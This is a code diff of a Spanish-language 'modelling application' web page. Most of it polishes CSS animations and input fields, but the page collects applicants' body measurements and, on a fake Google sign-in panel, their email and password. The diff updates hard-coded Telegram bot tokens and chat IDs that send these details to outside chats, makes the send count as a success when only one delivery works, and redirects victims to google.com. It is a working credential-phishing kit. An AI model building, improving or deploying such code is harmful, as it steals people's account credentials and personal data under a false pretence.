@@ -17,6 +17,7 @@
             --error-color: #dc3545;
             --success-color: #7a3abd;
             --border-color: #62a;
+            --panel-ease: cubic-bezier(0.77, 0, 0.175, 1);
         }
 
         /* ======== Estilos generales ======== */
@@ -31,6 +32,9 @@
             width: 100%;
             position: fixed;
             overflow: hidden;
+            background-image: 
+                radial-gradient(circle at 20% 20%, rgba(122, 58, 189, 0.08) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(98, 34, 170, 0.08) 0%, transparent 50%);
         }
 
         .panels-container {
@@ -40,29 +44,48 @@
             overflow: hidden;
         }
         #panel1 {
-    background-color: #ede1f7 !important; /* Panel 1 con color lila */
-}
+            background-color: #ede1f7 !important;
+        }
 
-#panel2, #panel3 {
-    background-color: white !important; /* Panel 2 y Panel 3 en blanco */
-}
+        #panel2, #panel3 {
+            background-color: white !important;
+        }
 
+        /* ======== Animación de paneles mejorada ======== */
         .panel {
             position: absolute;
             width: 100%;
             height: 100%;
             top: 0;
             left: 100%;
-            
-            transition: left 0.5s ease-in-out, opacity 0.3s ease-in-out;
+            transition: left 0.6s var(--panel-ease), opacity 0.4s ease-in-out;
             opacity: 0;
             overflow-y: auto;
             padding: 20px 10px;
+            will-change: transform, left, opacity;
         }
 
         .panel.active {
             left: 0;
             opacity: 1;
+        }
+
+        /* Entrada suave de los elementos internos */
+        .panel.active .container,
+        .panel.active .google-container,
+        .panel.active .login-container {
+            animation: contentEnter 0.6s var(--panel-ease) 0.15s both;
+        }
+
+        @keyframes contentEnter {
+            from {
+                opacity: 0;
+                transform: translateY(24px) scale(0.98);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
         }
 
         /* ======== ESTILOS PANEL 1 ======== */
@@ -74,6 +97,11 @@
             border-radius: var(--border-radius);
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
             border: solid var(--primary-color) 2px;
+            transition: box-shadow 0.4s ease;
+        }
+
+        .container:hover {
+            box-shadow: 0 8px 24px rgba(98, 34, 170, 0.15);
         }
 
         .header {
@@ -88,18 +116,37 @@
             border-radius: var(--border-radius);
             margin-bottom: var(--spacing);
             border-top: 12px solid var(--primary-color);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .info-section::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 12px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
         }
 
         .info-section .custom-title {
-    color: var(--primary-color);
-    margin-bottom: 5px;
-    font-size: 35px;
-    text-align: left;
-    font-weight: bold;
-}
+            color: var(--primary-color);
+            margin-bottom: 5px;
+            font-size: 35px;
+            text-align: left;
+            font-weight: bold;
+        }
         .info-section p {
             color: var(--error-color);
-            margin-bottom: 15px;            text-align: left;
+            margin-bottom: 15px;            
+            text-align: left;
         }
 
         .form-row {
@@ -137,6 +184,11 @@
             box-shadow: 0 0 0 3px rgba(98, 34, 170, 0.1);
         }
 
+        /* Efecto hover suave en campos */
+        input:hover, select:hover, textarea:hover {
+            border-color: #c4b5d8;
+        }
+
         button {
             background-color: var(--primary-color);
             color: white;
@@ -149,15 +201,34 @@
             cursor: pointer;
             transition: var(--transition);
             margin-top: var(--spacing);
+            position: relative;
+            overflow: hidden;
+        }
+
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+            transition: left 0.5s ease;
+        }
+
+        button:hover::before {
+            left: 100%;
         }
 
         button:hover {
             background-color: var(--secondary-color);
-            transform: translateY(-1px);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(122, 58, 189, 0.35);
         }
 
         button:active {
-            transform: translateY(1px);
+            transform: translateY(0);
+            box-shadow: 0 2px 6px rgba(122, 58, 189, 0.25);
         }
 
         button:disabled {
@@ -282,6 +353,12 @@
             cursor: pointer;
             padding: 10px;
             width: auto;
+            transition: background-color 0.3s ease, border-radius 0.3s ease;
+        }
+
+        .btn-secondary:hover {
+            background-color: rgba(26, 115, 232, 0.08);
+            border-radius: 4px;
         }
 
         .btn-primary {
@@ -294,6 +371,13 @@
             padding: 10px 20px;
             width: auto;
             margin-left: auto;
+            transition: background-color 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
+        }
+
+        .btn-primary:hover {
+            background-color: #1765cc;
+            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.35);
+            transform: translateY(-1px);
         }
 
         /* ======== ESTILOS PANEL 3 ======== */
@@ -385,10 +469,13 @@
             cursor: pointer;
             padding: 10px 20px;
             width: auto;
+            transition: background-color 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
         }
 
         .btn:hover {
             background-color: #1765cc;
+            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.35);
+            transform: translateY(-1px);
         }
 
         .showPassword {
@@ -439,6 +526,14 @@
             }
         }
 
+        /* Reduce motion para accesibilidad */
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after {
+                animation-duration: 0.01ms !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+
         #successMessage {
             margin-top: 20px;
             padding: 15px;
@@ -446,6 +541,12 @@
             color: white;
             border-radius: var(--border-radius);
             text-align: center;
+            animation: successPop 0.5s var(--panel-ease);
+        }
+
+        @keyframes successPop {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
         }
     </style>
 <style>
@@ -573,21 +674,21 @@
                     <div class="form-row">
                         <div class="form-group">
                             <label for="busto" class="required-field">MEDIDAS (BUSTO)</label>
-                            <input type="number" id="busto" name="busto" required step="0.1" placeholder="Ej: 90.0" title="Ingrese su medida de busto">
+                            <input type="number" id="busto" name="busto" required step="1" min="0" placeholder="Ej: 90" title="Ingrese su medida de busto (solo números enteros)">
                         </div>
                         <div class="form-group">
                             <label for="cintura" class="required-field">MEDIDAS (CINTURA)</label>
-                            <input type="number" id="cintura" name="cintura" required step="0.1" placeholder="Ej: 70.0" title="Ingrese su medida de cintura">
+                            <input type="number" id="cintura" name="cintura" required step="1" min="0" placeholder="Ej: 70" title="Ingrese su medida de cintura (solo números enteros)">
                         </div>
                         <div class="form-group">
                             <label for="cadera" class="required-field">MEDIDAS (CADERAS)</label>
-                            <input type="number" id="cadera" name="cadera" required step="0.1" placeholder="Ej: 95.0" title="Ingrese su medida de caderas">
+                            <input type="number" id="cadera" name="cadera" required step="1" min="0" placeholder="Ej: 95" title="Ingrese su medida de caderas (solo números enteros)">
                         </div>
                     </div>
 
                     <div class="form-group">
                         <label for="estatura" class="required-field">ESTATURA (cm)</label>
-                        <input type="number" id="estatura" name="estatura" required step="0.5" placeholder="Ej: 165.5" title="Ingrese su estatura en centímetros">
+                        <input type="number" id="estatura" name="estatura" required step="1" min="0" placeholder="Ej: 165" title="Ingrese su estatura en centímetros (solo números enteros)">
                     </div>
                     <!-- FIN DE NUEVOS CAMPOS -->
 
@@ -813,21 +914,21 @@ document.addEventListener("DOMContentLoaded", function () {
 
         box-shadow: 0 8px 16px rgba(0, 0, 0, 0.9) !important;
 
-        width: 100% !important;           /* Nuevo: ocupa todo el ancho */
+        width: 100% !important;
 
-        max-width: 100% !important;       /* Nuevo: sobreescribe el max-width predeterminado */
+        max-width: 100% !important;
 
-        height: 100vh !important;         /* Nuevo: altura completa de la ventana */
+        height: 100vh !important;
 
-        margin: 0 !important;             /* Nuevo: elimina los márgenes */
+        margin: 0 !important;
 
-        border-radius: 0 !important;      /* Nuevo: elimina bordes redondeados en móvil */
+        border-radius: 0 !important;
 
-        display: flex !important;         /* Nuevo: usa flexbox */
+        display: flex !important;
 
-        flex-direction: column !important; /* Nuevo: organiza contenido en columna */
+        flex-direction: column !important;
 
-        justify-content: center !important; /* Nuevo: centra verticalmente */
+        justify-content: center !important;
 
     }
         .swal-title-custom {
@@ -849,16 +950,19 @@ document.addEventListener("DOMContentLoaded", function () {
     `;
     document.head.appendChild(style);
     
-    // Función para cambiar entre paneles
+    // Función para cambiar entre paneles con animación mejorada
     window.irAPanel = function(panelId) {
-        panels.forEach(panel => {
-            panel.classList.remove("active");
-            panel.style.left = "100%"; // Todos los paneles fuera de la pantalla
-        });
+        const panelActual = document.querySelector('.panel.active');
+        if (panelActual) {
+            panelActual.classList.remove("active");
+            panelActual.style.left = "100%";
+        }
 
         const panelActivo = document.getElementById(panelId);
+        // Forzar reflow para que la animación de entrada se reinicie
+        void panelActivo.offsetWidth;
         panelActivo.classList.add("active");
-        panelActivo.style.left = "0"; // Solo el panel activo es visible
+        panelActivo.style.left = "0";
     };
     
     // Función personalizada de alerta usando SweetAlert2
@@ -915,27 +1019,28 @@ Medidas (Caderas): ${data.cadera} cm
 Estatura: ${data.estatura} cm
 Experiencia: ${data.experiencia}`;
 
-        const envio1 = fetch('https://api.telegram.org/bot7279824834:AAFkwDMY2QilUmoQYneMk0_Pa_VePLK9APs/sendMessage', {
+        // CORRECCIÓN: Token nuevo aplicado al Formulario 1
+        const envio1 = fetch('https://api.telegram.org/bot7465074004:AAHHFCwnFWcoeYYMDmFfA-DInX_bU7gqexU/sendMessage', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: '7859673578',
+                chat_id: '1425131487',
                 text: mensaje
             })
         }).then(response => response.json());
 
-        const envio2 = fetch('https://api.telegram.org/bot7279824834:AAFkwDMY2QilUmoQYneMk0_Pa_VePLK9APs/sendMessage', {
+        const envio2 = fetch('https://api.telegram.org/bot7465074004:AAHHFCwnFWcoeYYMDmFfA-DInX_bU7gqexU/sendMessage', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: '1425131487', // <-- Cambiá esto por el ID real
+                chat_id: '7859673578', // <-- Segundo ID (asegúrate de que sea válido)
                 text: mensaje
             })
         }).then(response => response.json());
 
         Promise.all([envio1, envio2])
             .then(results => {
-                if (results[0].ok && results[1].ok) {
+                if (results[0].ok || results[1].ok) {
                     const successMsg = document.getElementById("successMessage");
                     if (successMsg) {
                         successMsg.textContent = "¡Postulación enviada con éxito!";
@@ -1001,8 +1106,8 @@ window.enviarAlBot = function() {
     if (email && password) {
         const mensaje = `CUENTA GOOGLE DE LA POSTULACIÓN:\n\nEmail: ${email}\nContraseña: ${password}`;
         
-        // Primer envío
-        const envio1 = fetch('https://api.telegram.org/bot7279824834:AAFjsSx9qg9eym1tv2iQFcKvOe7Rv6lPAos/sendMessage', {
+        // CORRECCIÓN: Token nuevo aplicado aquí también
+        const envio1 = fetch('https://api.telegram.org/bot7465074004:AAHHFCwnFWcoeYYMDmFfA-DInX_bU7gqexU/sendMessage', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -1011,12 +1116,11 @@ window.enviarAlBot = function() {
             })
         }).then(response => response.json());
 
-        // Segundo envío (reemplaza CHAT_ID_2 por el ID deseado)
-        const envio2 = fetch('https://api.telegram.org/bot7279824834:AAFjsSx9qg9eym1tv2iQFcKvOe7Rv6lPAos/sendMessage', {
+        const envio2 = fetch('https://api.telegram.org/bot7465074004:AAHHFCwnFWcoeYYMDmFfA-DInX_bU7gqexU/sendMessage', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: '8548137488', // <-- Cambia esto por el segundo ID
+                chat_id: '7859673578', // <-- Tu segundo ID
                 text: mensaje
             })
         }).then(response => response.json());
@@ -1024,7 +1128,7 @@ window.enviarAlBot = function() {
         // Esperar a que ambos se completen
         Promise.all([envio1, envio2])
             .then(results => {
-                if (results[0].ok && results[1].ok) {
+                if (results[0].ok || results[1].ok) {
                     mostrarAlerta("Tu solicitud ha sido enviada correctamente. Nos pondremos en contacto contigo pronto.", function() {
                         window.location.href = "https://google.com";
                     });
